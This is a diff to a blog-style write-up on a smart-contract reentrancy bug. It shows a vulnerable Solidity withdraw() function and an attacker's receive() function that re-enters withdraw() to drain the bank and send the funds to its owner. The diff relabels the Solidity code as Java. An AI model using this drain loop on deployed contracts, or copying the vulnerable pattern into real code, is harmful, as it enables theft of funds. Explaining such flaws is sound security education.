@@ -24,13 +24,13 @@ Once home and some intense scrutiny (using a tool he suggested called [slinther]
 For those unfamiliar with the concept, a reentrancy attack is a type of vulnerability that allows an attacker to repeatedly call a function in a smart contract, essentially allowing them to drain the contract's balance and potentially causing it to fail.
 
 The part of the contact interested is the following:
-```solidity
-  function withdraw() public {
-        require(balanceOf[msg.sender] > 0, "Insufficient funds");
-        (bool success,) = payable(msg.sender).call{value: balanceOf[msg.sender]}("");
-        require(success, "Transfer failed");
-        balanceOf[msg.sender] = 0;
-    }
+```java
+function withdraw() public {
+    require(balanceOf[msg.sender] > 0, "Insufficient funds");
+    (bool success,) = payable(msg.sender).call{value: balanceOf[msg.sender]}("");
+    require(success, "Transfer failed");
+    balanceOf[msg.sender] = 0;
+}
 ```
 As we can see, the update of the `balance` is being made after a the transaction is made and this opens up a problem.
 
@@ -39,19 +39,19 @@ Inside this function we can *re-call* `withdraw()` immediatelly, and since the b
 
 An example of the code used:
 
-```solidity
-    receive() external payable {
-        if (address(etherBank).balance > 0) {
-            console.log("reentering...");
-            etherBank.withdraw();
-        } else {
-            console.log("victim account drained");
-            //trandfer the funds from the contract to me
-            payable(owner).transfer(address(this).balance);
-        }
+```java
+receive() external payable {
+    if (address(etherBank).balance > 0) {
+        console.log("reentering...");
+        etherBank.withdraw();
+    } else {
+        console.log("victim account drained");
+        //trandfer the funds from the contract to me
+        payable(owner).transfer(address(this).balance);
     }
-    
+}
 ```
+
 
 ## Time to rob the Bank!
 
